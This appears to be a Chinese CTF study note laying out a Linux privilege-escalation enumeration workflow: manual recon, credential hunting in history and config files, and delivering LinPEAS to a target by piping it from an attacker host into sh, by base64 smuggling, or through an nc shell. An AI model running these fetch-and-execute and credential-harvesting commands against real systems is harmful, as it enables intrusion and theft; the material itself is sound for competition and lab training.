---
title: Linux提权1：本地枚举与信息收集标准工作流 (SOP)
date: 2026-03-15 14:00:00
tags:
- 提权
- Linux
- 本地信息收集
categories:
- ISW
- Linux提权
---

Linux 本地枚举与信息收集标准工作流 (SOP)
==========================

在获取 Linux 系统的低权限 Shell 后，本地信息收集是决定提权路径的核心环节。其核心目标是通过系统化的信息搜集，绘制出当前运行环境的全貌，并识别潜在的配置缺陷或内核漏洞。

标准的枚举流程分为**手工枚举**与**自动化枚举**两个阶段。

**建议直接跑自动化脚本**，自动化脚本跑完根据经验来手动收集信息

# 手工枚举流程

手工枚举的目标是在不依赖外部脚本的情况下，快速摸清当前机器的核心状况。在比赛中遇到无法上传文件或环境受限（如没有 `curl`/`wget`）时，这是破局的唯一方法。

## 系统与架构信息

确认目标是什么系统、什么架构、内核版本有多老。如果内核版本在特定区间（如 `2.6.x` 或 `3.x` 到 `5.x` 早期），往往可以直接考虑 Dirty COW (CVE-2016-5195) 或 Dirty Pipe (CVE-2022-0847) 等经典内核漏洞。

```bash
uname -a                    # 查看内核版本、系统架构 (x86 还是 x64)
cat /proc/version           # 查看内核版本的详细编译信息
cat /etc/issue              # 查看发行版标识
cat /etc/*release           # 或 lsb_release -a，查看详细的 OS 版本信息
lscpu                       # 查看 CPU 架构信息
hostnamectl                 # 查看主机名、虚拟化平台 (VMware/VBox) 及架构
```

## 用户与权限状态(优先级：最高)

明确“我是谁”、“还有谁”、“我能免密执行什么”。

```bash
whoami                      # 查看当前用户名
id                          # 查看当前用户的 UID、GID 及所属组 (重点关注 docker, lxd, adm 等高危组)
id root                     # 查看 root 用户的基本信息作为对比 (红队补充)
sudo -l                     # 【黄金命令】查看当前用户是否可以免密 (NOPASSWD) 运行某些 root 命令
cat /etc/passwd | grep sh   # 查看系统上所有具备登录 shell 的用户
who / w                     # 查看当前系统有哪些用户登录，以及他们在干什么 (红队补充)
last                        # 查看系统最近的用户登录历史 (红队补充)
env                         # 查看环境变量，有时会泄露敏感路径或凭据
history                     # 【必看】查看历史命令，往往能发现管理员输错的密码或数据库连接
ls -liah ~/                 # 查看家目录下的隐藏文件，重点看 .bash_history 和 .ssh 目录 (红队补充)
```

## 网络与路由

了解靶机在内网中的位置，寻找是否有隐藏的服务仅对本地 `127.0.0.1` 开放。

```bash
ip a || ifconfig            # 查看所有网卡 IP
ip route                    # 查看路由表，判断网络出口 (红队补充)
netstat -antup || ss -antp  # 查看当前开放的端口及连接 (重点关注只监听本地的高危服务如 MySQL)
arp -a || ip neigh          # 查看 ARP 缓存，发现同网段存活主机，为内网横向做准备 (红队补充)
cat /etc/hosts              # 查看内网主机名解析
```

## 进程与计划任务

寻找以 root 身份运行的脆弱进程、不安全的定时任务。

```bash
ps aux | grep root          # 查看 root 运行的进程
ps -ef                      # 另一种查看所有进程的常用命令
cat /etc/crontab            # 【高频考点】查看系统级计划任务，重点关注任务调用的脚本我们是否可写
ls -la /etc/cron.* # 查看每日/每周/每月的定时任务脚本
# 比赛时如果有条件，推荐上传 pspy 工具，可以动态监控没有读权限的 cron 任务执行情况
```

## 文件系统与配置缺陷 (核心提权点)

寻找错误配置的权限，这是最常考的提权点。

### 1. 危险权限查找

```bash
# 【经典】查找 SUID 文件 (运行该文件时会临时继承其 root 权限)
find / -perm -u=s -type f 2>/dev/null

# 【进阶】查找 Capabilities (比 SUID 更隐蔽的权限下放，如 python3 cap_setuid=ep)
getcap -r / 2>/dev/null

# 查找当前用户可写的文件或目录 (配合计划任务漏洞使用)
find / -writable -type d 2>/dev/null
```

### 2. 环境探测 (红队精髓)

在你决定用什么语言写反弹 Shell 或提权脚本前，必须先摸清靶机上装了什么

```bash
#一键探测靶机上安装了哪些常用环境和黑客工具 (红队图12)
which awk perl python ruby gcc vi vim nmap find netcat nc wget tftp ftp tmux screen 2>/dev/null
# 注：一定要加上 2>/dev/null 把报错信息扔掉，保持终端整洁。
```

### 3. 敏感信息搜索

```bash
# 检查关键密码文件权限 (如果 shadow 全局可读，直接拿去爆破哈希)
ls -la /etc/passwd
ls -la /etc/shadow
# 检查磁盘挂载情况 (有时会发现挂载了备份盘或特殊的逻辑卷)
cat /etc/fstab 
# 查找可能包含明文密码的配置文件 (.conf, .bak, .txt 等)
grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null
```

# 自动化枚举

**核心解题思维：LinPEAS 一把梭**

在 ISW 这种时间紧迫的综合渗透比赛中，**这篇笔记只讲一个工具：LinPEAS**。熟练掌握 LinPEAS 的投递和结果阅读，足以应对绝大多数提权场景。

## 下载LinPEAS (攻击机端)

在比赛开始前，你的 Kali 机里必须常备最新版的 LinPEAS。下载最新稳定版 `linpeas.sh` 到你的常用工作目录：

我放在 ` ~/ISW_Workspace/Tools `里了

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
# 赋予执行权限备用
chmod +x linpeas.sh
```

## 把LinPEAS部署到靶机

比赛中靶机的情况千奇百怪（没网、没 curl、没 wget、目录不可写）。以下是三种将 LinPEAS 送进靶机并运行的万能方法，按优先级尝试：

### 靶机有网，或与攻击机网络互通

在你的 Kali (攻击机) 上：

```bash
# 开启 HTTP 服务 (假设 linpeas.sh在当前目录)
python3 -m http.server 80
```

在靶机上（直接内存执行，不留痕迹）：

```bash
curl -L http://<Kali-IP>/linpeas.sh | sh
# 或者
wget -qO- http://<Kali-IP>/linpeas.sh | sh
```

### 断网且无下载工具（Base64 大法）

如果靶机连 `curl` 和 `wget` 都没有，或者防火墙拦了入站请求。在你的 Kali (攻击机) 上：

```bash
# 将脚本压缩并进行 base64 编码，去掉换行符
cat linpeas.sh | gzip -9 | base64 -w 0
# 将终端输出的那一大串乱码复制下来！
```

在靶机上：

```bash
# 进入一个大概率可写的目录
cd /tmp 
# 将乱码还原成脚本并执行
echo "<这里粘贴你复制的那一大坨Base64乱码>" | base64 -d | gzip -d > lin.sh
chmod +x lin.sh
./lin.sh
```

### 极其受限的 Shell（直接通过 SSH/NC 喂进去）

如果你是通过 nc 反弹的 shell，可以在 Kali 本地直接把脚本“喂”给建立好连接的端口：

```bash
nc -lvnp 4444 < linpeas.sh
```

## 如何使用LinPEAS

把脚本弄上去之后，怎么跑也是有讲究的。直接运行输出太多容易刷屏，推荐以下几种实战跑法：

### 标准跑法带日志记录 (推荐)

直接运行会把终端刷满，导致你往回翻的时候卡顿或者信息丢失。使用 `tee` 命令可以**边看边把结果存入文件**，带上 `-r` 还能保留颜色编码（颜色极其重要！）：

```bash
./linpeas.sh | tee peass.out
# 跑完之后，慢慢用 less 查看并保留颜色
less -r peass.out
```

### 全面深度扫描 (耗时较长，没思路时用)

加上 `-a` 参数会执行最彻底的系统检查（包括搜索所有的隐藏文件、深入读取日志等）。

```bash
./linpeas.sh -a | tee peass.out
```

### 极速模式 (时间紧迫时用)

如果你只想快速看一眼内核漏洞和基础的配置错误，跳过耗时的文件系统深度搜索：

```bash
./linpeas.sh -s
```

## 如何分析LinPEAS 的输出

LinPEAS 运行时会输出几千行，只需要注意下面三种颜色：

1. **红黄高亮**
   **含义**：极高概率的提权点。
   **常见命中**：
   
   - 存在严重的内核 CVE 漏洞 (如 Dirty COW)。
   
   - 当前用户有 `NOPASSWD` 的 sudo 权限。
   
   - 极度危险的 SUID 文件。
   
   **动作**：看到红黄底色，直接去GTFOBins 查怎么打。

2. **纯红色**
   **含义**：安全配置错误或敏感信息泄露。
   **常见命中**：
   
   * `/etc/shadow` 文件可读。
   
   * 在 `.bash_history` 或某处的 `.conf` 文件里找到了明文密码
   
   * 不安全的计划任务 (Cron Jobs) 指向了你能修改的脚本。
   
   如果红黄色没出结果，把所有红色的字仔细过一遍。

3. **青色/蓝色**
   
   * 帮你快速定位哪些进程是你这个普通用户运行的。
